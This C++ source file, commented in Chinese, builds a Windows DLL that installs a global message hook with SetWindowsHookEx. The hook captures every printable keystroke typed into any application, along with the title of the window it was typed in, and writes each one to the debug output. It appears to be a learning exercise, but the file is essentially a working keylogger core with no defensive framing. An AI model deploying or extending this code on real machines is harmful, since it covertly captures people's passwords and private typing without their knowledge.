// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <windows.h>
#include <iostream>

HHOOK g_hHook = nullptr;
HINSTANCE g_hInstance = nullptr;
LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode) // 说明有消息到来
	{
		PMSG pMsg = (PMSG)lParam;
		if (WM_CHAR == pMsg->message)
		{
			// 确定此时已经按下了一个键
			char szKey = (char)pMsg->wParam;

			// 有效字符消息 在32和126之间
			if (szKey >= 32 && szKey <= 126)
			{
				char szWindowName[MAXBYTE] = { 0 };
				char szDebug[MAXBYTE] = { 0 };
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);
				sprintf_s(szDebug, MAXBYTE, "窗口名： %s接收到了一个消息：%c", szWindowName, szKey);
				OutputDebugStringA(szDebug);
			}
			
		}
	}

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}


extern "C"
_declspec(dllexport) BOOL StartHook()
{
	// 需要在DLL动态链接库中实现这个函数
	// 因为只有动态链接库才是全局共享的
	// 回调函数 Hook 已经Hook好了 只等鱼上钩了！！！
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);
	if (nullptr == g_hHook)
	{
		// 返回的是数字
		SetLastError(GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL UnHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook);
	}
	return FALSE;
}

// main 函数
// dll其实也有main函数的， 入后函数
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: // 当DLL被加载入进程时触发
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH: // 当DLL被线程运行是触发
	case DLL_THREAD_DETACH: // 当DLL在线程中运行完成时触发
	case DLL_PROCESS_DETACH: // 当DLL被从进程中剥离的时候触发
		UnHook();
		break;
	}
	return TRUE;
}

